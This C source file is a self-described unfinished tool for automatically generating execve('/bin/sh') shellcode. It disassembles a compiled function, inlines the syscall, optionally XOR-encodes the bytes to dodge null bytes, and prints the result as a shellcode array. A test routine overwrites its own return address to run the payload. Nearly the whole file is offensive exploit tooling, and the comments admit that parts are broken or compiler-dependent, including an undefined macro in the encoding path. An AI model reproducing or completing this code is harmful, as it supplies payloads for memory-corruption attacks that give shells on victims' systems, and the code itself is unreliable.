/* Attempt to automatically generate shell code for any architecture.
 * Unfinished because most archs use 32bit instructions for syscalls (hence
 * there are zero's in the resulting string).
 *
 * This version attempts to xor encode itself to avoid 0's
 * However, I gave up when I realized there was no platform independent
 * way to retrieve the IP without using 0's itself... The problem is
 * that on gcc x86, a call to a label generates a 32 bit relative argument 
 * to the call instruction that contains 0s.
 *
 * Compile with: gcc-2.95 autocode.c -o tmp -fPIC -static -g
 * */
#include <stdio.h>
#include <stdlib.h>
#include <syscall.h>
#include <string.h>


//#define ENCODE_SHELLCODE

#ifdef ENCODE_SHELLCODE
# define KEY 0x11 // Must NOT be present in shellcode
#else
# define KEY 0
#endif

#define enc_copy_byte(a, b, size) \
do { \
	*(a) = *(b) ^ KEY; \
	if(*(a) == 0) \
		printf("Zero byte at 0x%lx\n", (long)(b));\
	(a)++; \
	(b)++; \
	(size)++; \
} while(0); 

// FIXME: This is unpossible, because execve tries to use errno
// #define CLEAN_EXIT 
#define sys_exit _exit
//#define TEST_C

#include <unistd.h>
/* TODO: Fix for cross compiling to different endianness */

typedef unsigned char opcode;
typedef void (*fcn_ptr)();

struct asm_info
{
	opcode op_nop;
	opcode op_call;
	opcode op_jmp;
	opcode op_ret;
	size_t jarg_size;
	size_t pro_size;
	size_t post_size;
	unsigned char *pro;
	unsigned char *post;
};

struct jump_list 
{
	unsigned char *from;
	void *dist;
	struct jump_list *next;
	struct jump_list *tail;
};

void start()
{
}

void pro_post()
{
}

void mark1()
{
}

void pro_nop_post()
{
	asm("nop\n");
}

void pro_call_post(int bs)
{
	((fcn_ptr)&&tmp)();  // Generates a call with offset 0
tmp:
	;
}

void pro_jmp_post()
{
	asm("nop\n");
	goto start;
	asm("nop\n"); 
tmp:                    // FIXME: this is a hack that works temporarily
	// with gcc v3.x. If suddenly ai->jarg_size ceases
	// to make sense, look here first
	asm("nop\n"); 
	printf("hello");
start:
	printf("hello");
	goto tmp;
	;
}

void end()
{
	unsigned long *ret;
	ret = (unsigned long *)&ret + 2;
}

struct asm_info *getasminfo()
{
	unsigned char *p, *q, *tmp;
	struct asm_info *ai = (struct asm_info *)calloc(1, sizeof(struct asm_info));

	for(p = (unsigned char *)pro_post, q = (unsigned char *)pro_nop_post; 
			*p == *q; p++, q++)
		;

	ai->op_nop = *(opcode *)q;
	q += sizeof(opcode);

	ai->pro_size = (unsigned long)p - (unsigned long)pro_post;
	ai->pro = (unsigned char *)calloc(1, ai->pro_size);
	memcpy(ai->pro, (void *)pro_post, ai->pro_size);
	tmp = q;

	/* GCC likes to pad functions with nops and 0's */
	while(*p == *q && (unsigned long)q != (unsigned long)pro_call_post
			&& *p != ai->op_nop && *p != 0x00)
	{
		p++;
		q++;
		ai->post_size++;
	}


	ai->post = (unsigned char *)calloc(1, ai->post_size);
	memcpy(ai->post, tmp, ai->post_size);

	ai->op_ret = ai->post[ai->post_size-1];

	if((unsigned long)p != (unsigned long)mark1)
	{
		printf("Error! p!=q at p=0x%lx mark1=0x%lx\n", (long)p, (long)mark1);
	}

	for(q = (unsigned char *)pro_call_post; *(unsigned long *)q != 0x0; 
			q++)
		;

	q -= sizeof(opcode);
	ai->op_call = *(opcode *)q;

	for(q = (unsigned char *)pro_jmp_post; *q != ai->op_nop; q++)
		;

	q++;
	ai->op_jmp = *(opcode *)q;

	for(tmp = ++q; *q != ai->op_nop; q++)
		;

	ai->jarg_size = q - tmp;

	return ai;
}


void Johnny5()
{
	register unsigned char *null;
	char **ret;

#ifdef ENCODE_SHELLCODE
	((fcn_ptr)&&decode)();
decode:
	for(null = (char *)((*((unsigned long *)&ret - STEP))
				+ &&start - &&decode); 
			*null != 'h' ^ KEY; null++)
		*null ^= KEY;
	asm("nop\n");
#endif


	goto call;

	/* Gcc puts junk code here to pad labels */
start:
	null = (unsigned char *)((unsigned long)null ^ (unsigned long)null);

	// FIXME: adjust.. This is variable depending on compiler.. Maybe write
	// an autoconf test? There's all sorts of stack padding
	// that can allow us to get lucky here..
	ret = (char **)((unsigned long)&ret - (STEP+1)*sizeof(int)); 
	ret[1] = (char *)null;
	execve(*ret, ret, (char **)null);
#ifdef CLEAN_EXIT
	sys_exit((int)null);
#endif

	/* Gcc puts junk code here to pad labels */
call:
	((fcn_ptr)&&start)();
	asm(".string \"/bin/sh\"");
	/* "/bin/sh" goes here */

	goto start; // Fake out gcc v3.x, otherwise it skips our code
}


/* Take a function at address fcn and stick it into tobuf */
int inline_call(void *fcn, struct asm_info *ai, unsigned char *tobuf)
{
	int size = 0;
	unsigned char *p = (unsigned char *)fcn;

	/* FIXME: This may not be very archetecture independent, but
	 * we make the same assumption in pro_call_post, so oh well */

	*tobuf++ = ai->op_call ^ KEY; 

	*tobuf++ = 0x00 ^ KEY;
	*tobuf++ = 0x00 ^ KEY;
	*tobuf++ = 0x00 ^ KEY;
	*tobuf++ = 0x00 ^ KEY;

	size += 5;

#ifdef ONE_BYTE_RET
	while(*p != ai->op_ret)
#else
		while(memcmp(p, ai->post, ai->post_size))
#endif
			enc_copy_byte(tobuf, p, size);

	return size; 
}

/* At first I wrote a nice generalized disassmble function, but then I 
   realized that I wouldn't always be able to tell what was an opcode and 
   what was an argument, so this function assumes you will be disassembling 
   Johnny5
 */
int disassemble(void *fcn, struct asm_info *ai, unsigned char *tobuf)
{
	unsigned char *p = (unsigned char *)fcn;
	int size = 0;
	int inc = 0;
	long dest = 0;
	unsigned char *jmp;
	int i;

#ifdef ENCODE_SHELLCODE
	/* The first thing we watch for is the call. We don't need any of the 
	   code before it. */
	while(*p != ai->op_call)
		p++;

	/* Now watch for the marker nop*/
	while(*p != ai->op_nop)
	{
		*tobuf++ = *p++;
		size++;
	}

	/* Copy the nop.. For some reason if we don't, alignment
	 * issues kill us */
	*tobuf++ = *p++;
	size++;

#endif

	/* Now skip the call up to the goto */
	while(*p != ai->op_jmp)
		p++;

	jmp = tobuf + sizeof(opcode);

	/* Now we want to watch for the call to execve */
	while(1)
	{
		while(*p != ai->op_call)
			enc_copy_byte(tobuf, p, size);

		// Find the destination point of execve to inline..
		dest = *(long *)(p+sizeof(opcode))
			+ ((unsigned long)p + sizeof(opcode) + sizeof(long));

		if((void *)dest == execve)
			break;

		enc_copy_byte(tobuf, p, size);
	}

	inc = inline_call((void *)dest, ai, tobuf);

	tobuf += inc;
	size += inc;
	p += sizeof(opcode) + sizeof(long);
	/* We're missing one call */
	inc = inc - sizeof(opcode) - sizeof(long);

#ifdef CLEAN_EXIT
	/* Then a call to exit */
	while(1)
	{
		while(*p != ai->op_call)
			enc_copy_byte(tobuf, p, size);

		dest = *(long *)(p+sizeof(opcode))
			+ ((unsigned long)p + sizeof(opcode) + sizeof(long));

		if((void *)dest == sys_exit)
			break;

		enc_copy_byte(tobuf, p, size);
	} 

	i = inline_call((void *)dest, ai, tobuf);
	tobuf += i;
	size += i;
	inc += i;
	p += sizeof(opcode) + sizeof(long);

	/* We're missing one call */
	inc = inc - sizeof(opcode) - sizeof(long);
#endif 

	/* THen the callback to ourselves */
	while(1)
	{
		while(*p != ai->op_call)
			enc_copy_byte(tobuf, p, size);

		dest = *(long *)(p+sizeof(opcode));

		if((unsigned long)p + dest > (unsigned long)fcn && dest < 0)
			break;

		enc_copy_byte(tobuf, p, size);
	} 

	// copy call opcode
	enc_copy_byte(tobuf, p, size);

	/* Fix the call. I assume it's argument is a long */
	*(long *)tobuf = *(long *)p - inc;

	// encode the dest 
	*tobuf++ ^= KEY;
	*tobuf++ ^= KEY;
	*tobuf++ ^= KEY;
	*tobuf++ ^= KEY;

	size += sizeof(opcode) + sizeof(long);
	p += sizeof(long);

	/* Now the jump (FIXME: encrypt)*/
	switch(ai->jarg_size)
	{
		case sizeof(unsigned char):
			*jmp ^= KEY; // decode
			*(char *)jmp += inc;
			*jmp ^= KEY; // encode
			break;
		case sizeof(short):
			*jmp ^= KEY; // decode
			*(jmp+1) ^= KEY; // decode
			*(short *)jmp += inc;
			*jmp ^= KEY; // encode
			*(jmp+1) ^= KEY; // encode
			break;
		case sizeof(int):
			*jmp ^= KEY; // decode
			*(jmp+1) ^= KEY; // decode
			*(jmp+2) ^= KEY; // decode
			*(jmp+3) ^= KEY; // decode
			*(int *)jmp += inc;
			*jmp ^= KEY; // encode
			*(jmp+1) ^= KEY; // encode
			*(jmp+2) ^= KEY; // encode
			*(jmp+3) ^= KEY; // enode
			break;
		default:
			*jmp ^= KEY; // decode
			*(char *)jmp += inc;
			*jmp ^= KEY; // encode
			printf("Error! Unknown jumpsize %d\n", ai->jarg_size); 
	}

	return size;
}

void printcode(unsigned char *code, int size)
{
	int i=0;

	printf("char shellcode[] = \n\t\"");

	for(i=0; i < size; i++)
	{
		if((i+1)%13 == 0)
			printf("\"\n\t\"");
		printf("\\x%x", code[i]&0xff);
	}
	printf("\";\n");
}

unsigned char shcode[200];
int size;

int test()
{
	unsigned long *ret;
	ret = (unsigned long *)&ret + 2;
	*ret = (unsigned long)(shcode);
	return 0;
}

int main()
{

	char *retc[] = {"/bin/sh", NULL};

#ifdef TEST_C
	Johnny5();
	return 0;
#endif


	size = disassemble(Johnny5, getasminfo(), shcode);

	//    strcpy((char *)shcode+size, "/bin/sh");

	printf("shcode size is %d\n", size);
	printcode(shcode, size);

	//    *(shcode-1) = 0xcc; /* intel: int3, for debugging */
	//    *(shcode + 139) = 0xcc; /* intel: int3, for debugging */

	test();

	return 0;
}

// vim:ts=4:noet:sw=4
